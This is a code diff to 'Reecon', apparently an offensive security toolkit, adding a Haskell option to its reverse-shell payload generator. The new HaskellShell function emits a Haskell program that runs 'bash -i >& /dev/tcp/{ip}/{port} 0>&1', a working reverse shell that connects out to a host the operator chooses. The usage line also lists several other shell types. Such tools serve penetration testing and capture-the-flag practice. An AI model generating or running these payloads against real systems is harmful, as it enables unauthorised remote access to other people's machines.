@@ -12,7 +12,7 @@ namespace Reecon
             if (args.Length < 2)
             {
                 Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
-                Console.WriteLine("Types: bash, jar, jsp, nc, nodejs, php, python, war");
+                Console.WriteLine("Types: bash, haskell, jar, jsp, nc, nodejs, php, python, war");
                 General.PrintIPList();
                 return;
             }
@@ -40,6 +40,14 @@ namespace Reecon
                 Console.WriteLine("Bash Shell");
                 Console.WriteLine("----------");
                 Console.WriteLine(BashShell(ip, port));
+            }
+            else if (shellType == "haskell")
+            {
+                Console.WriteLine("Haskell Shell");
+                Console.WriteLine("-------------");
+                Console.WriteLine(HaskellShell(ip, port));
+                Console.WriteLine();
+                Console.WriteLine("--> Save as filename.hs (Note: Only use letters - No numbers or special characters)");
             }
             else if (shellType == "jar")
             {
@@ -128,6 +136,12 @@ namespace Reecon
             return toReturn;
         }
 
+        private static string HaskellShell(string ip, string port)
+        {
+            return "module Main where" + Environment.NewLine
+                    + "import System.Process" + Environment.NewLine
+                    + $"main = callCommand \"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"";
+        }
         private static string JavaShell(string ip, string port)
         {
             // Can catch with a default nc listener - No need to use metasploit
